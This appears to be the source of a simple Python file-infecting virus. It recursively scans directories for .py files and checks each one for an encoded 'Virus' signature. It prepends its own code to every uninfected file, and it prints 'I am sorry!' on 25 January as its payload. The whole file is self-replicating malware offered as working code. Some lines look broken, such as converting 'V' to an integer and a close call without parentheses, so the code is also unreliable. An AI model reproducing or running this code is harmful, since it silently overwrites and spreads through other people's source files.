import os
import random
import datetime

match = ""
matchkey = 9
key = random.randrange(1, 9)

print ("Key: ")
print (key)

decodeKey = 1
pos = 0

encryptedSIG = ""
SIGNATURE = "Virus"
decodeKey = int(SIGNATURE[0])
SIGNATURE = SIGNATURE[:pos] + SIGNATURE[(pos+1):]

print ("SIG: ")
print (SIGNATURE)

for i in SIGNATURE:
    temp = ord(i) - decodeKey
    matchtemp = chr (temp)
    temp = chr(key + temp)
    encryptedSIG += temp
    match += matchtemp
encryptedSIG = str(key) + encryptedSIG


def search(path):
    breaker = 0
    tempmatch = ""
    filestoinfect = []
    filelist = os.listdir(path)

    for fname in filelist:
        tempmatch = ""
        print ("FileName:")
        print (fname)

        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))

        elif fname[-3:] == ".py":
            infected = False
            k = open(path+"/"+fname)

            for i, line in enumerate(k):
                breaker = 0

                if i == 11 and line[13].isdigit():
                    matchkey = line[13]
                    print ("MatchKey: ")
                    print (matchkey)

                    for j in range(14, 33):
                        tempmatch += chr(ord(line[j]) - int(matchkey))

                print ("TempMatch")
                print (tempmatch)
                print (match)

                if match == tempmatch:
                    infected = True
                    print ("True")
                    breaker = 1
                    break

            if breaker == 1:
                print ("Break")

            if infected == False:
                filestoinfect.append(path+"/"+fname)

    return filestoinfect


def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""

    for i,line in enumerate(virus):

        if i>0 and i<84 and i != 11:
            virusstring += line

        if i == 10:
            virusstring += "SIGNATURE = \"" + encryptedSIG + "\"\n"

    virus.close

    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write("import os\n" + virusstring + temp)
        
        f.close()


def payload():
    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
        print ("I am sorry!")

filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
payload()
